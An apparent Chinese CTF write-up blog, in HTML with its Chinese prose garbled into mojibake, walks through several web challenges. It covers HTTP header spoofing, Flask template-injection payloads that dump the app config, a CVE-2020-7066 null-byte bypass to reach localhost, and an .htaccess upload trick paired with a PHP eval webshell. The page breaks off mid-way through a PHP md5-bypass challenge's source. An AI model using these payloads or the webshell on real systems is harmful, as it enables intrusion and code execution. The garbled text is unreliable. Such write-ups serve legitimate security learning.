    <content type="html"><![CDATA[<h1 id="BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ‰“å¼€ä¹‹åæ˜¯ä¸ªç™»é™†ç•Œé¢ï¼Œè¿˜ä»¥ä¸ºæ˜¯ä¸€ä¸ªSQLæ³¨å…¥ï¼Œå°è¯•äº†ä¸€ä¸‹ä¸‡èƒ½å¯†ç ï¼Œå‘ç°è¿›å»äº†æ˜¯ä¸ªæ¬¢è¿ç•Œé¢</p><p>æ²¡åŠæ³•äº†ï¼Œç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•<br><img src="/img/Nepnep/å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€0.png" alt="avatar"></p><p>å‘ç°äº†/.DS_Storeæ–‡ä»¶æ³„éœ²</p><p>ç›´æ¥URLè®¿é—®å¾—åˆ°äº†DS_Storeæ–‡ä»¶ï¼Œç”¨dsstoreå·¥å…·åˆ©ç”¨ä¸€ä¸‹<br><img src="/img/Nepnep/å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€1.png" alt="avatar"><br>å‘ç°äº†å‡ ä¸ªPHPæ–‡ä»¶å’Œä¸€äº›CSS</p><p>profile.phpå°±æ˜¯ä¸€ä¸ªæ¬¢è¿ç•Œé¢ï¼Œindex.phpå°±æ˜¯ç™»å½•</p><p>æ‰€ä»¥è®¿é—®ä¸€ä¸‹L0g1n.php</p><p>æç¤ºäº†<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, <span class="keyword">this</span> site will be available after totally <span class="number">99</span> years!</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°åŸºæœ¬ä¸Šè€ƒçš„æ˜¯ä¿¡æ¯çš„ä¼ªé€ </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>ä¿¡æ¯ä¼ªé€ æ˜¯æ¯”è¾ƒå¸¸è§„çš„ä¸€ç§è€ƒæ³•äº†</p><p>åœ°å€ä¼ªé€ :<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span></span><br></pre></td></tr></table></figure><br>ä»£ç†åœ°å€ä¼ªé€ :<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">client</span>-<span class="built_in">ip</span></span><br></pre></td></tr></table></figure></p><p>ç½‘ç«™ä¼ªé€ :<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span></span><br></pre></td></tr></table></figure><br>æµè§ˆå™¨ä¼ªé€ :<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span>-Agent</span><br></pre></td></tr></table></figure></p><p>æ—¥æœŸä¼ªé€ :<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-Unmodified-Since</span></span><br></pre></td></tr></table></figure></p><p>ä»£ç†æœåŠ¡å™¨ä¼ªé€ :<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Via</span></span><br></pre></td></tr></table></figure></p><p>é‚®ç®±ä¼ªé€ ï¼š<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">From</span></span><br></pre></td></tr></table></figure></p><h2 id="æµ‹è¯•è¿‡ç¨‹"><a href="#æµ‹è¯•è¿‡ç¨‹" class="headerlink" title="æµ‹è¯•è¿‡ç¨‹"></a>æµ‹è¯•è¿‡ç¨‹</h2><p>bpæŠ“åŒ…ï¼ŒæŠŠæ—¶é—´åé¢åŠ ä¸Šå¥½å¤š0ï¼Œå¤§äº99å¹´å³å¯<br><img src="/img/Nepnep/å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€2.png" alt="avatar"></p><p>å¾—åˆ°æç¤ºè¦æœ¬åœ°è®¿é—®<br>ä½¿ç”¨<code>X-Forwarded-For:127.0.0.1</code></p><p>ç»“æœå‘ç°è¢«banæ‰äº†ï¼Œæ‰€ä»¥ç”¨client_ipè¯•è¯•<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></p><p>åˆè¯´è¦ä»gem-love.comè®¿é—®ï¼Œæ‰€ä»¥å°±ä¼ªé€ <br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Referer:</span>gem-love.com</span><br></pre></td></tr></table></figure><br>å¾—åˆ°æç¤ºè¦ä»Commodo 64è®¿é—®ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ‰‹æç”µè„‘å«Commodore<br>è¯•äº†ä¸€ä¸‹<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:Commodore <span class="number">64</span></span><br></pre></td></tr></table></figure><br>è¿˜è¦é‚®ç®±ä¼ªé€ <br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">From</span>:root<span class="variable">@gem-love</span>.com</span><br></pre></td></tr></table></figure><br>çœ‹åˆ°proxyï¼Œä»£ç†æœåŠ¡å™¨ä¼ªé€ <br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Via:</span>y1ng.vip</span><br></pre></td></tr></table></figure><br>æœ€åå¾—åˆ°ä¸€ä¸²base64ï¼Œè§£ç å¾—åˆ°flag</p><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ‰“å¼€å°±æ˜¯æºç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><br>å®¡è®¡äº†ä¸€ä¸‹ï¼Œä½¿ç”¨äº†flaskæ¡†æ¶ï¼Œè¿˜ç”¨äº†os</p><p>çœ‹åˆ°index()ä¸­æœ‰ä¸€ä¸ª open(__file__).read()</p><p>æ¥ç€çœ‹shrineï¼Œå‘ç°äº†ç”¨æ­£åˆ™å’Œreplaceè¿‡æ»¤æ‰äº†ä¸€äº›ä¸œè¥¿</p><p>ä¸çŸ¥é“ä»€ä¹ˆæ“ä½œï¼Œå»çœ‹äº†ä¸€ä¸‹WPï¼Œå‘ç°æ˜¯ä¹‹å‰å­¦åˆ°è¿‡çš„æ¨¡æ¿æ³¨å…¥</p><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>æ¨¡æ¿æ³¨å…¥åœ¨ä¹‹å‰åœ°fake googleå°±åšè¿‡ï¼ŒåŸºæœ¬ä¸Šäº†è§£å•¦</p><p>è¿™é‡Œæ¶‰åŠä¸¤ä¸ªå‡½æ•°<br><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url_for</span><br><span class="line">(<span class="number">1</span>)ç»™æŒ‡å®šçš„å‡½æ•°æ„é€  URLã€‚</span><br><span class="line">(<span class="number">2</span>)è®¿é—®é™æ€æ–‡ä»¶(CSS / JavaScript ç­‰)ã€‚ åªè¦åœ¨ä½ çš„åŒ…ä¸­æˆ–æ˜¯æ¨¡å—çš„æ‰€åœ¨ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸º static çš„æ–‡ä»¶å¤¹ï¼Œåœ¨åº”ç”¨ä¸­ä½¿ç”¨ /static å³å¯è®¿é—®</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_flashed_messages</span><span class="params">()</span>  é¡¾åæ€ä¹‰ï¼Œæ„æ€å¤§æ¦‚å°±æ˜¯å–å€¼</span></span><br></pre></td></tr></table></figure></p><h2 id="æµ‹è¯•è¿‡ç¨‹-1"><a href="#æµ‹è¯•è¿‡ç¨‹-1" class="headerlink" title="æµ‹è¯•è¿‡ç¨‹"></a>æµ‹è¯•è¿‡ç¨‹</h2><p>è®¿é—®/shrine</p><p>å…ˆéªŒè¯æœ‰æ²¡æœ‰æ¨¡æ¿æ³¨å…¥<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;<span class="number">2</span>+<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœ<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure></p><p>éªŒè¯äº†æœ‰æ¨¡æ¿æ³¨å…¥</p><p>payload<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].<span class="built_in">config</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line"></span><br><span class="line">shrine/&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].<span class="built_in">config</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>å¾—åˆ°flag</p><p>è¿™ä¸ªåœ°æ–¹ï¼Œæƒ³ç”¨ä¹‹å‰çš„æ¨¡æ¿æ³¨å…¥<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯æ˜¯ç©ºçš„</p><p>()åˆè¢«banäº†ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•æ­£å¸¸å›æ˜¾</p><p>ä¹‹ååˆç”¨è¿™ä¸ªurl_forå’Œget_flashed_messageså»å°è¯•äº†ä¸€ä¸‹ä¹‹å‰çš„æ¨¡æ¿æ³¨å…¥ï¼Œå‘ç°å®Œå…¨å¯è¡Œï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œå­¦åˆ°äº†å­¦åˆ°äº†</p><h1 id="GKCTF2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h1><p>çœ‹æç¤ºæ˜¯ä¸€ä¸ªcve-2020-7066</p><p>ç™¾åº¦ä¸€ä¸‹ï¼Œçœ‹åˆ°è¿™ç¯‡æ–‡ç« <br><a href="https://blog.csdn.net/weixin_45485719/article/details/106432960" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45485719/article/details/106432960</a></p><h2 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>åœ¨PHP7.3ç‰ˆæœ¬ä¸­ä½¿ç”¨<code>get_headers()</code>ä¼šæˆªæ–­URLä¸­ç©ºå­—ç¬¦åçš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// user input</span></span></span><br><span class="line"><span class="php">$_GET[<span class="string">'url'</span>] = <span class="string">"http://localhost\0.example.com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$host = parse_url($_GET[<span class="string">'url'</span>], PHP_URL_HOST);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (substr($host, <span class="number">-12</span>) !== <span class="string">'.example.com'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$headers = get_headers($_GET[<span class="string">'url'</span>]);</span></span><br><span class="line"><span class="php">var_dump($headers);</span></span><br></pre></td></tr></table></figure><p>ç»“æœ<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headers <span class="keyword">from</span> http:<span class="comment">//localhost</span></span><br></pre></td></tr></table></figure></p><h2 id="æµ‹è¯•è¿‡ç¨‹-2"><a href="#æµ‹è¯•è¿‡ç¨‹-2" class="headerlink" title="æµ‹è¯•è¿‡ç¨‹"></a>æµ‹è¯•è¿‡ç¨‹</h2><p>ç‚¹å‡»è¿æ¥ï¼Œå‘ç°å‡ºç°äº†<code>?url=http://www.ctfhub.com</code></p><p>F12æŸ¥çœ‹ä¸€ä¸‹ï¼Œåœ¨Headerä¸­å¾—åˆ°æç¤º<br>Flag in localhost</p><p>æŒ‰ç…§åˆšæ‰æ–‡ç« ä¸­çš„æ–¹æ³•ï¼Œä½¿ç”¨%00æˆªæ–­</p><p>æ„é€ payload<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.1%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure><br>åˆå¾—åˆ°ä¸€ä¸ªæç¤ºï¼ŒHost must be end with â€˜123â€™</p><p>ä¿®æ”¹ä¸€ä¸‹<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.123%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag</p><h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p>æ‰“å¼€æ˜¯ä¸ªä¸Šä¼ ç•Œé¢ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªPHPï¼Œè¢«banäº†å¾ˆæ­£å¸¸ï¼Œä¿®æ”¹Content-typeå‘ç°æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä¿®æ”¹PHPåç¼€åä¹Ÿæ²¡æœ‰ç”¨</p><p>PHPèŠ±å¼åç¼€<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">phtml</span><br><span class="line">phps</span><br><span class="line">phpt</span><br></pre></td></tr></table></figure><br>æŸ¥ä¸€ä¸‹WP</p><p>å‘ç°æ˜¯ä¸Šä¼ .htaccessæ–‡ä»¶æ¥è§£æå›¾ç‰‡ğŸ</p><h2 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="htaccessæ–‡ä»¶"><a href="#htaccessæ–‡ä»¶" class="headerlink" title=".htaccessæ–‡ä»¶"></a>.htaccessæ–‡ä»¶</h3><p>ç™¾åº¦å¾—åˆ°çš„æ„æ€è§£ææ˜¯<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.htaccessæ–‡ä»¶(æˆ–è€…<span class="string">"åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶"</span>ï¼‰,å…¨ç§°æ˜¯Hypertext <span class="keyword">Access</span>(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚</span><br></pre></td></tr></table></figure><br>å°±æ˜¯apacheæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶</p><p>æ¥ç€åˆçœ‹åˆ°äº†.htaccessæ–‡ä»¶ä¸Šä¼ çš„æ–‡ç« <br><a href="https://www.jianshu.com/p/c674904a711e" target="_blank" rel="noopener">https://www.jianshu.com/p/c674904a711e</a></p><h4 id="å¸¸è§å§¿åŠ¿ä¸€"><a href="#å¸¸è§å§¿åŠ¿ä¸€" class="headerlink" title="å¸¸è§å§¿åŠ¿ä¸€"></a>å¸¸è§å§¿åŠ¿ä¸€</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FileMatch å‚æ•°å³ä¸ºæ–‡ä»¶åçš„æ­£åˆ™åŒ¹é…</span></span><br><span class="line"><span class="section">&lt;FilesMatch "sniperoj"&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sniperoj</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¸¸è§å§¿åŠ¿äºŒ"><a href="#å¸¸è§å§¿åŠ¿äºŒ" class="headerlink" title="å¸¸è§å§¿åŠ¿äºŒ"></a>å¸¸è§å§¿åŠ¿äºŒ</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¸¸è§å§¿åŠ¿ä¸‰"><a href="#å¸¸è§å§¿åŠ¿ä¸‰" class="headerlink" title="å¸¸è§å§¿åŠ¿ä¸‰"></a>å¸¸è§å§¿åŠ¿ä¸‰</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è‡ªè§£æçš„ .htaccess</span></span><br><span class="line"><span class="section">&lt;Files "\.htaccess"&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br><span class="line"><span class="section">&lt;FilesMatch "\.htaccess"&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="comment"># &lt;?php eval($_GET[c]);?&gt;</span></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="comment"># ä¸è¿‡è¿™ç§æ–¹å¼æµ‹è¯•å¹¶æ²¡æœ‰æˆåŠŸ... æš‚æ—¶ä¸æ¸…æ¥šåŸå› </span></span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•è¿‡ç¨‹-3"><a href="#æµ‹è¯•è¿‡ç¨‹-3" class="headerlink" title="æµ‹è¯•è¿‡ç¨‹"></a>æµ‹è¯•è¿‡ç¨‹</h2><p>ä¸Šä¼ .htaccessæ–‡ä»¶,ä½†æ˜¯è¿™é‡Œç”±äºContent-Typeåªæ¥å—image/jpeg<br><img src="/img/Nepnep/ä½ ä¼ ä½ é©¬å‘¢0.png" alt="avatar"></p><p>æ¥ç€ä¸Šä¼ 51nd0re1.jpgçš„å›¾ç‰‡é©¬å°±è¡Œ<br><img src="/img/Nepnep/ä½ ä¼ ä½ é©¬å‘¢1.png" alt="avatar"></p><p>ç”±äºä¸Šä¼ äº†.htaccessæ–‡ä»¶ï¼Œè¿™ä¸ªå›¾ç‰‡é©¬å°±ä¼šè¢«æ­£å¸¸è§£æï¼Œç›´æ¥è®¿é—®æä¾›çš„åœ°å€<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/db3e8839bdd7ac63daec00365c554da2/<span class="number">51</span>nd0re1.jpg</span><br></pre></td></tr></table></figure><br>èšå‰‘è¿æ¥å¾—åˆ°flag</p><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>æ‰“å¼€F12çœ‹åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span 